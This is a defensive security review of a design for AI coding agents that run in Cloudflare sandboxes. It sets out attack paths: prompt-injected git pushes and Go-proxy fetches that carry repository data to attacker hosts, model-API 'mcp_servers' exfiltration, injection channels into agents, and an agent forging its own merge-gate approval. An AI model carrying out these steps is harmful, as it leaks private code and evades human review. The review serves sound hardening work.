# Security review of the Tributary agent layer on Cloudflare

Scope: `cloudflare/AGENT-LAYER.md` (AL), the agent rows of `cloudflare/DESIGN.md` (CD), `cloudflare/cost_agents.py`, and the token model in `DESIGN.md` (root) that CD reuses. Read as an attacker on 2026-10-26.

## Verdict

**Holds with changes.** The pick is the right security shape:
- Agents stay GitHub Apps on the GHES surface.
- Every agent write ends in `decide`.
- Artifacts plays no role.
- There is no new coordination object.

Artifacts' whole-repository tokens with no veto would be strictly weaker (`research/artifacts-recheck.md` 110, 140) [measured].

The layer's central injection claim does not hold as written: "the worst write is a malicious diff in a draft PR" (AL 173). Five problems break it:
- The sandbox egress allowlist works by hostname. Two of the three allowed hosts are general-purpose: the Tributary host itself and the model API.
- The one human-independence control is a commit status with no head binding.
- Provenance trailers and session refs are unauthenticated, yet they are rendered as first-party evidence.
- `trib-mcp` is an MCP proxy with a static upstream client id. It misses the spec's per-client consent MUSTs.
- Its refresh token drops the user's narrowing.

None of this changes the pick. Every fix lands in the outbound handler, `decide`, fold rows, or `trib-mcp`.

## Findings

### 1. Sandbox egress is host-granular, so the Tributary host and the model API become exfiltration channels (blocker)

**Where:** AL 125 to 128 (`outbound`, `Allowed`), 165, 173 to 174, 280, 387, 418.

**Failure path, Tributary host.**
- An outside contributor has an account on the host. They filed the issue, so they must have one, and in managed mode anyone can sign up. Their visible issue text tells the agent to run `git push https://<attacker PAT>@<host>/attacker/loot.git HEAD:refs/heads/tributary/<task>/x`.
- The handler allows the host. The ref matches `refs/heads/tributary/<task>/`.
- Nothing in AL 126 pins the repository path or replaces a credential the sandbox supplied. The base repository's private contents land in the attacker's repository [inferred].
- The same works through gists. The GHES surface Tributary serves includes gists (root DESIGN.md 715, T2), so "there is no gist to write to" (AL 173) is false once T2 ships.
- It also works through issue comments in attacker-owned repositories and through the host's package registries (root DESIGN.md 754).

**Failure path, model API.**
- The handler attaches the org's model key to any request bound for the model host.
- The Anthropic Messages API accepts `mcp_servers: [{ url }]` and connects to any public MCP server [measured, https://platform.claude.com/docs/en/agents-and-tools/mcp-connector].
- So one request body carries repository contents to an attacker URL, billed to Tributary's key.

**Failure path, pull-through registries.**
- A GET to a pull-through registry turns into an attacker-observed fetch. For any module path, proxy.golang.org "will try to download it just as any Go user would" [measured, https://proxy.golang.org/ FAQ].
- `GET /attacker.example/<chunk>/@v/list` therefore reaches the attacker's server at any rate the agent chooses. "Low-rate" (AL 418) is wrong for that class of registry [inferred].

**Evidence.**
- Cloudflare's pattern pins method, path, and repository: "The entrypoint allows it for one repository and rejects every other request" [measured, https://developers.cloudflare.com/sandbox/network/clone-a-private-repository/].
- AL 126 lists only host allowlisting, token attachment, and a ref-prefix check on receive-pack.
- "Comment and Control" exfiltrated over git push because the host was allowlisted (`research/agents.md` 4.11).
- The containment row (AL 387) tests unlisted hosts and proxy POSTs. It does not test other repositories on the allowed host, or the model API.

**Fix.** Make `outbound` a default-deny router.
- **Tributary host:** allow only smart HTTP on `/{base}.git` and `/{fork}.git`, and REST under `/api/v3/repos/{base or fork}/`. Refuse `/api/graphql`, `/gists`, `/_registry`, uploads, and every other owner path. Always overwrite `Authorization`, `Cookie`, and URL userinfo with the handler's token.
- **Model host:** allow only the inference path. Parse the JSON body and refuse `mcp_servers`, server-side tool types (web fetch, web search, code execution), and file and batch endpoints. Better still, run the model loop in the controller so the sandbox never calls the model API directly.
- **Registries:** allow only registries that do not proxy upstream, or a customer mirror with unknown-name upstream fetch disabled. Refuse Go module paths outside an allowlist.
- **New containment rows,** each 0 of 100 succeeding:
  - a push to another repository on the host with a sandbox-supplied token;
  - gist creation;
  - a model request with `mcp_servers`;
  - a fetch of an unknown Go module path.
- **Text:** drop "there is no gist to write to" from AL 173.

### 2. `tributary/agent-gate` is a spoofable commit status with no head binding (major)

**Where:** AL 74 to 77, 168, 173; `cost_agents.py` 49; CD 263 to 266.

**Failure path A, approve then push.**
- Bob approves the agent's PR at head H1, which sets `satisfied_by = Bob`.
- The agent is still running, or is re-injected through a later comment. It pushes H2 to the same branch, which `decide` allows because it is inside the prefix.
- `AgentGate { pr, satisfied_by }` has no head (AL 77). `cost_agents.py` line 49 prices exactly two gate writes per PR, "pending, then success".
- So one of two things happens [inferred]:
  - success is re-posted on H2 from `satisfied_by`, and unreviewed code merges; or
  - nothing posts on H2, and the PR stalls.

**Failure path B, forged status.**
- Anyone with "Commit statuses" write can post any context through `POST /repos/{o}/{r}/statuses/{sha}` [measured, GHES 3.22 permissions-required-for-github-apps].
- If `tributary-agent` posts the gate, the sandbox's REST calls carry that App's token through the handler. The agent can then post `success` itself. Other Apps and Actions `GITHUB_TOKEN` can do the same.
- Alice, the requester, then merges her own agent's PR with no second human. That is the one property the gate exists to provide.

**Evidence.** The refusal list (CD 263 to 265) does not cover statuses or check runs. The gate is defined only as a status (AL 75; compatibility table, "Agent merge gate").

**Fix.**
- Enforce the gate in `Merge::decide`. Refuse `Merge` of any PR that has `AgentMeta` unless all of the following hold:
  - `AgentGate { pr, head, satisfied_by }` exists;
  - `head` equals the current head;
  - `satisfied_by` is a writer who is not the agent App, not the requester, and not anyone who pushed to that head.
- Render the status from the fold, for display only.
- Add to the `ActorKind::Agent` refusals: creating statuses or check runs whose context starts with `tributary/`.
- Have the handler refuse `/statuses` and `/check-runs` writes from the sandbox.
- **New Milestone 0 rows,** each refused 100 of 100:
  - approve, then the agent pushes, then merge;
  - the agent token posts `tributary/agent-gate`.

### 3. `PROTECTED_PATHS` is not a CI boundary, and "changes under" is undefined (major)

**Where:** CD 263 to 270, 850; AL 50 to 57, 163, 166, 168, 173, 437.

**Failure path A, in-repo mode.**
- The agent edits files that are not protected but that CI executes: `scripts/test.sh`, `Makefile`, `package.json` scripts, a local composite action under `.github/actions/<name>/action.yml`, or `.gitmodules`.
- Its push to `refs/heads/tributary/<task>/x` in the base repository triggers `on: push` workflows from that branch. Those wait as `action_required`.
- A writer clicks approve to see CI. The unchanged workflow then runs the changed script with the repository's secrets on an unrestricted runner [inferred].
- "CI on its pushes runs without secrets until a writer approves it" (AL 173) is accurate, and it is the problem: approval covers a run, not a reviewed diff.

**Failure path B, no new objects.**
- An outsider's fork PR edits `.github/workflows/ci.yml`. Its commits are already in the network's packs.
- An injected in-repo agent fetches `refs/pull/N/head`, which it can read, and pushes that oid to `refs/heads/tributary/<task>/x`.
- `validate` fills `Provenance` "from the new commits" (CD 271). If the protected-path check also walks only new commits, it sees none.
- The outsider's workflow then runs as an in-repo branch, with secrets, after one approval click [inferred].
- The design never says whether "changes" means the new commits in the pack or a tree diff against a base.

**Failure path C, instruction files.**
- The list protects `AGENTS.md` but not `CLAUDE.md`, `.claude/**` (settings and hooks), `.cursor/**`, `.cursorrules`, `GEMINI.md`, `.codex/**`, `.mcp.json`, or `.vscode/**`.
- Yet the layer itself runs Claude Code and Codex templates (AL 164) [inferred from harness conventions].

**Fix.**
- Define the rule in `decide`. For every agent ref update, diff the new tip's tree against the merge base with the default branch, and also against the old tip. Refuse if any changed path matches.
- Extend the list to:
  - local actions;
  - `.gitmodules`;
  - CODEOWNERS;
  - every instruction and settings path the install's harness templates read.
- Let repository policy add build entry points to the list.
- In in-repo mode, run workflows for agent pushes with fork-PR semantics (read-only token, no secrets), even after approval. Release secrets only when `AgentGate` is satisfied for that exact head.
- **New row:** push an existing outsider oid that changes a workflow; refused 100 of 100.

### 4. Agent authority is ref-shaped, so the App's REST powers and a compromised controller escape `decide` (major)

**Where:** CD 263 to 268; AL 55, 70, 126, 163, 279 to 280, 315, 388; root DESIGN.md 394 to 395.

**Failure path, REST side effects.**
- In-repo, `tributary-agent` holds `contents: write` (AL 163). `POST /repos/{o}/{r}/dispatches` needs only Contents write [measured, GHES 3.22 permissions page].
- A dispatch runs default-branch `repository_dispatch` workflows with an attacker-shaped `client_payload` and the repository's secrets. No `action_required` applies, because nothing was pushed.
- With issues or pull_requests write, the agent can add labels such as `safe-to-test`, which many repositories use to release `pull_request_target` runs [inferred].
- Neither action is in the refusal list.

**Failure path, per-task prefix.**
- `decide` cannot enforce a per-task prefix. Installation token claims are `app, installation, repos, permissions, jti, iat, exp, kid` (root DESIGN.md 394 to 395). None names a task.
- So `AgentActor.prefix` can only come from `AgentApp.confine`, an App-wide pattern such as `refs/heads/tributary/**`.
- The ceiling row "to another task's prefix ... refused" (AL 388) can only be met by the handler, which runs in the agents account.

**Failure path, compromised controller.**
- The controller holds both Apps' private keys and mints tokens for every installation. In managed mode that is one agents account per cell (AL 315).
- So it can:
  - push into any task's branch after review;
  - dispatch workflows;
  - read every installed private repository.
- The controller failure row (AL 279) claims `decide` caps that damage at `tributary/<task>/`.

**Fix.**
- Add to the `ActorKind::Agent` refusals:
  - `dispatches`;
  - workflow dispatch and re-run;
  - label writes outside a per-repository allowlist;
  - branch rename;
  - release and tag creation;
  - webhook and deploy-key edits.
- Mint per-task tokens that carry a `task` claim, so `decide` itself enforces `refs/heads/tributary/<task>/`.
- Restate the controller blast radius honestly. In managed mode, use per-tenant agents accounts or per-tenant App keys.
- Rerun the ceiling row with the handler bypassed (a raw token), so that it actually tests `decide`.

### 5. Provenance trailers and session refs are unauthenticated but displayed as first-party evidence (major)

**Where:** CD 271 to 279, 592, 742; AL 58 to 65, 72 to 74, 129 to 131, 166 to 167, 186 to 189, 394, 416, 445.

**Failure path A, forged trailer.**
- Any pusher can write `Tributary-Session: https://<host>/_tributary/sessions/<a real uuid>` and `Co-authored-by: Alice` into a commit.
- `validate` records it. Blame and the PR page link it, and the first-party `tributary/provenance` check run lists it (AL 187).
- A human's malicious commit now looks like reviewed, logged agent output. Equally, an agent commit can be attributed to a human.
- Trailer values are free strings rendered as links. Without scheme and host validation, a phishing or `javascript:` URL appears under a Tributary label [inferred].

**Failure path B, forged or erased log.**
- Nothing restricts who may push `refs/tributary/sessions/*`.
- CD 263 to 265 lets an agent update "its own session ref". But `AgentActor` (CD 268) has no session field, so "its own" cannot be checked, and any agent App can rewrite any session.
- Human writers, unflagged Apps, and `GITHUB_TOKEN` are not addressed at all.
- The session URL is uuid-only (AL 166, 188). An attacker can push a forged log under a victim's uuid into a repository they own, and the edge has to pick one of the two.
- A writer can delete a log to erase the record.
- The hidden prefix also works as a stash that clones and reviews never see.

**Failure path C, session header.** `X-Tributary-Agent-Session` (AL 72 to 74) is free-form, so one flagged App can claim another App's session.

**Confidentiality and deletion.**
- The log is pushed as plain text into the repository the agent pushed to. Any reader can fetch it, including tool outputs and test logs; in a public in-repo repository, that means anyone.
- "Ref deletion plus GC" (AL 416) leaves copies in four places:
  - the vault, under a 35-day bucket lock;
  - lifeboats;
  - exports;
  - clone caches.
- `RestoredTo` can bring the ref back [inferred from CD 592, 742].

**Fix.**
- Make `refs/tributary/` host-owned. `decide` refuses every update there except from the controller App, appends only, and deletes only through a retention command.
- Record `Source::Session` only when a controller-recorded `AgentMeta` entry for that commit's pusher matches. Show every other trailer as "claimed", unlinked, with https scheme and host validation.
- Resolve session pages under `/{owner}/{repo}/` or through the fold only.
- Bind `X-Tributary-Agent-Session` to sessions the same App opened.
- Run secret scanning on logs before pushing them, and redact large tool outputs.
- Default retention to the org's audit-log retention, and state that a purge completes only after the vault lock expires.

### 6. Prompt injection reaches agents through channels the trust view does not cover (major)

**Where:** AL 82 to 100, 164, 172 to 174, 180, 187, 196 to 198.

**Failure paths.**
- **Edit after assignment.** A maintainer reads a clean issue and assigns the agent. The outside author then edits the body. The controller and the agent's own REST reads see the new visible text, and nothing ties the prompt to the version the assigner saw [inferred].
- **Tributary's own check runs relay outsider text.** `tributary/overlap` lists `Conflict { files }`, and `tributary/provenance` lists trailer values. Both are attacker strings: a path in a fork PR, a trailer in any commit. Third-party agents read check runs through the Checks API (AL 180). Tributary therefore relays outsider text into every overlapping agent PR under a first-party App's name.
- **The `can_push` filter admits Apps.** It is the filter in AL 100 and 164. An injected in-repo agent posts a comment on another issue. The next agent's prompt includes that comment, because its author can push. This chains agents together.
- **MCP sanitizes only bodies.** Diffs, file contents, commit messages, review comments, and check-run text pass through raw.
- **Multi-repository MCP tokens.** Consent allows up to four repositories (AL 107, 196). A token over one public and one private repository recreates the toxic flow the layer cites (`research/agents.md` 4.8).
- **The working tree.** Harnesses load nested instruction and settings files from the checkout, whatever the controller puts in the prompt (finding 3).
- **Webhooks.** `issues.assigned` deliveries carry the issue body. GitHub-style HMAC has no timestamp, so a captured delivery can be replayed to start tasks [inferred].

**Fix.**
- Snapshot the issue at the `Assigned` entry index. Pause the task if a non-writer edits the title or body after that.
- Escape and length-cap file paths and trailer values in check-run text, and label them as untrusted data.
- Remove `is_bot` authors and every `AgentApp` from the trusted-author set.
- Apply `TrustView` to every text field MCP returns, labelled with author trust.
- Refuse write-capable MCP tokens that span repositories of different visibility or owner.
- Treat webhook payloads as triggers only: re-read state over REST and dedupe on delivery id.

### 7. `trib-mcp` misses the spec's confused-deputy MUSTs for a proxy with a static upstream client id (major)

**Where:** AL 102 to 109, 195 to 198, 415.

**Failure path.**
- Every CIMD client maps to one first-party GHES App, `Tributary MCP` (AL 195).
- The client's request is "sealed in `state`" with no binding to the user's browser, and the design shows no consent step before the redirect to GHES.
- The attack:
  1. An attacker publishes a CIMD document named "Claude Code" with `redirect_uris` on its own domain.
  2. It starts `/authorize` with its own PKCE verifier and sends the victim the resulting link, which is on the trusted host.
  3. GHES skips consent for an already-authorized first-party App, and the callback returns with the sealed state.
  4. If the `trib-mcp` consent page is skipped, pre-filled, or framed, the code goes to the attacker, who redeems it with the verifier.
- PKCE does not help, because the attacker created the challenge.

**Evidence** [measured, modelcontextprotocol.io 2026-07-28 `security-considerations` and `security_best_practices`].
- "MCP proxy servers using static client IDs MUST obtain user consent for each dynamically registered client before forwarding to third-party authorization servers."
- The consent page "MUST ... Show the registered redirect_uri".
- State must be bound by a `__Host-` cookie, set only after consent, and single-use.
- `frame-ancestors` must forbid framing.
- CIMD authorization servers "MUST clearly display the redirect URI hostname" and "SHOULD display additional warnings for localhost-only redirect URIs".

**Revocation.** A user can revoke only `Tributary MCP` as a whole, which kills every client at once, and a stateless server has no client list to show (AL 198) [inferred].

**CIMD fetch.**
- AL 102 says `trib-mcp` "calls the edge only". But CIMD needs outbound fetches to arbitrary HTTPS URLs, and the spec asks servers to consider SSRF [measured].
- Workers subrequests should not reach private addresses [inferred]. The realistic abuse is using `trib-mcp` as a fetch reflector and serving slow documents.

**Fix.**
- Serve a `trib-mcp` consent page before the GHES redirect. It shows:
  - the CIMD host, not just `client_name`;
  - every redirect URI host;
  - a warning when the redirect is localhost only;
  - the repositories, toolsets, and read or write requested.
- After consent, set a signed `__Host-` SameSite=Lax cookie bound to the state, verify it at callback, and send `frame-ancestors 'none'`.
- Record approved client ids in the user's `Identity` group, so a settings page lists and revokes each client. Tokens then carry a grant id that is checked on refresh.
- Harden CIMD fetches:
  - 5 s timeout and 5 KB cap;
  - no redirects;
  - deny the install's own zones;
  - cache per HTTP headers;
  - rate-limit `/authorize` per IP.

### 8. `McpRefresh` drops the narrowing and wraps an unscoped six-month GHES refresh token (major)

**Where:** AL 106 to 109, 196 to 197.

**Failure path.**
- At `/token`, `trib-mcp` redeems the code for an unscoped `ghu_` plus a `ghr_`, then calls `token/scoped`. That endpoint takes "a non-scoped user access token" [measured, GHES 3.22 `rest/apps/apps`].
- Nothing says the unscoped token is revoked afterwards.
- `McpRefresh` holds only `client`, the sealed `ghr_`, and `exp` (AL 109).
- On refresh, GHES returns a new unscoped `ghu_`: "Once you use a refresh token, that refresh token and the old user access token will no longer work." The refresh token "expires after six months" [measured, GHES 3.22 `refreshing-user-access-tokens`].
- `trib-mcp` no longer knows the consented repositories, toolsets, or write flag. The refreshed `McpToken` is therefore either unscoped, which escalates to every repository the user can reach, or undefined [inferred].
- A leaked sealing key plus any stored `McpRefresh` yields an unscoped six-month credential.

**Replay.** Rotation happens only at GHES. A stolen `McpRefresh` used first wins, the legitimate client's next refresh fails, and nothing revokes the thief's new chain (AL 197 relies on single use alone) [inferred].

**Fix.**
- Seal `sub`, `aud`, `repos`, `tools`, `write`, and a grant id into `McpRefresh`, and call `token/scoped` again on every refresh.
- Delete the unscoped `ghu_` with `DELETE /applications/{client_id}/token` immediately after scoping. Test that the `ghr_` survives this [unverified].
- Keep the current refresh generation per grant as one row in the user's `Identity` group. Refuse older generations, and on reuse call `DELETE /applications/{client_id}/grant`.
- **New rows:** a refreshed token keeps its scope 100 of 100; a replayed refresh revokes the grant.

### 9. `DELETE /installation/token` cannot revoke a stateless `ghs_` token (major)

**Where:** AL 7, 156, 234; CD 366 to 375, 391, 446 to 451; root DESIGN.md 392 to 395, 435 to 437.

**Failure path.**
- An agent installation token leaks through a log or an injected agent. The vendor calls `DELETE /installation/token` and gets 204.
- AL 156 says the next write "reads the revocation on its `Tokens` leader". That mechanism does not exist for these tokens:
  - Installation tokens are stateless: `ghs_` plus a compact JWS signed in `trib-ops` (root DESIGN.md 392 to 395, 437; reused at CD 391).
  - `Tokens` shards are keyed by a stored secret, `token_shard(secret: &[u8; 30])` (CD 366 to 369).
  - The base revokes stateless tokens only through installation `not_before` on uninstall, and through job `jti` for `GITHUB_TOKEN` (root DESIGN.md 435, 437).
- The revoked token keeps working for writes until `exp`, which can be an hour away [inferred].

**Fix.**
- On `DELETE /installation/token`, commit the token's `jti` and `exp` to a `Tokens` shard chosen by a hash of the `jti`.
- Write-class requests check that shard on the leader, as they already do for stored tokens. Reads honor it within `READ_CACHE`.
- Rows expire at `exp`, so the table stays small.
- **Add to the A2 oracle row:** revoke, then push 1 s later; refused 100 of 100.

### 10. Cheap reads and malicious Apps can exhaust shared git CPU and the group leader (major)

**Where:** AL 34 to 49, 140, 144 to 148, 220, 289; CD 250 to 262, 347, 518 to 520, 846, 849.

**Failure paths.**
- **Read-triggered test merges.**
  - PrSync computes `refs/pull/N/merge` "on GET or CI request" (AL 47).
  - After each base move, an anonymous client on a public repository, or any reader of a private one, GETs every open PR.
  - At 500 PRs and 10 base moves a minute, that is 83 GETs a second. It buys the 125 vCPU of merges that lazy test merges were adopted to avoid (AL 144, CD 519).
  - Those merges run on the same k shards that validate pushes (AL 42 to 44).
  - The lazy-merge row (CD 849) measures only honest GETs.
- **No per-owner budget for fan-out.**
  - `fanout` follows measured load (AL 46).
  - Fan-out shards come from a `max_instances` reserve that changes only by site day (CD 347, 520).
  - An owner who makes several of its own networks hot claims that reserve. The real monorepo then drops below k = 5, and at k = 1 it fails (AL 220) [inferred].
- **Derived commands escape `AGENT_SHARE`.**
  - Each admitted agent push yields one PrSync command and two check runs, which are admitted as Bot (AL 140, 289).
  - The layer orders Bot ahead of Agent (AL 35).
  - At 5,000 agents, 150 admitted pushes a second produce 300 check runs plus 150 PrSync commands. That is over the 300 commands/s gate by itself [inferred from AL 140 ratios].
  - An unflagged malicious App is simply Bot class, with no share cap at all.
- **The wait queue lives in the leader.**
  - Overflow waits up to 30 s inside group commit (CD 250 to 252).
  - With `INLINE_MAX_HOT` at 256 KiB, 500 queued inline packs are 125 MiB, against a Durable Object's fixed 128 MB (`research/agents.md` 6.4).
  - The burst row (CD 846) sends exactly 500 pushes [inferred].

**Fix.**
- **Test merges:**
  - give them a compiled per-network CPU cap, like `PREDICT_CPU`;
  - run them below push validation;
  - coalesce per (PR, base);
  - compute on GET only for writer or CI tokens; everyone else gets `null` and a queued job.
- **Fan-out:** budget fan-out shards per owner and reserve them by plan.
- **Derived commands:**
  - charge PrSync and check runs to the admission class of the push that caused them;
  - write check runs only when the verdict changes (AL 436 already suggests this);
  - cap Bot commands per App.
- **Leader queue:**
  - under admission pressure, queue only `PackRef::Stored`;
  - cap queued agent commands by count and by bytes;
  - refuse at the edge before staging.
- **New Milestone 0 rows:**
  - adversarial GETs after base moves;
  - a hostile owner's hot networks beside the A1 monorepo;
  - a 500-push burst of 256 KiB packs.

## Checked and found sound

- **Rejecting Artifacts.** It also holds on security grounds. Artifacts tokens cover a whole repository with no branch scope, no protected refs, and no veto, so an agent "can force-push any ref" (`research/artifacts-recheck.md` 110, 140). `decide` is the only place a write is refused at the moment it happens. The best-of-N flip condition keeps chosen attempts on Tributary's own receive path.
- **No credential inside the sandbox.** Tokens are attached by the outbound handler, which matches Cloudflare's documented pattern [measured]. This becomes a real boundary once the handler pins paths (finding 1).
- **MCP token handling.**
  - `trmcp_` tokens are never accepted on `/api/v3`.
  - Audience is checked in the MCP row.
  - Upstream narrowing is enforced by the host through `token/scoped`, which meets the spec's no-passthrough MUST [measured against the spec].
- **Fork mode's permission ceiling.** The base App holds `contents: read`, and an installation token "cannot be granted permissions that the app was not granted" (`research/agents.md` 4.2). Fork PR workflows without secrets are documented 3.22 behavior (`review/cloudflare-agents-judge.md` 78).
- **No change for unmodified clients.** `body` and `body_html` stay byte-identical, and the trust view is opt-in. The byte-diff row checks this.
